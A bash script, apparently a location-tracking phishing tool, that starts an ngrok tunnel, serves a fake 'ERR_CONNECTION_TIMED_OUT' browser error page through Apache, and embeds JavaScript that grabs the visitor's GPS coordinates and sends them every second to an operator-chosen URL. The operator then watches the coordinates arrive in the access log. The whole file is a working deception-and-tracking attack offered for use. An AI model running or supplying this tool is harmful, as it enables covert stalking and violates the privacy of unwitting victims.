#!/bin/bash

#64_bit
#xterm -e ./ngrok http 80 & clear

#32_Bit
xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!

                                                           by- vkvbit
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>ERR_CONNECTION_TIMED_OUT</title>

            <link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300&display=swap" rel="stylesheet">

	<style type="text/css">
		body {
			font-family: 'Roboto', sans-serif;
			margin: 15%;
			margin-top: 35%;
			font-size: 150%;
		}
	</style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
        
            <!-- target's page -->
	<h1>This site can't be reached</h1>
	<h3><b>www.google.com</b> took too long to respond</h3><br>
	<h3>Try:</h3>
	<h3>Checking the connection</h3><br>
	<h3>ERR_CONNECTION_TIMED_OUT</h3>
            
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
service apache2 start
echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!

                                                           by- vkvbit
                                                                     " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
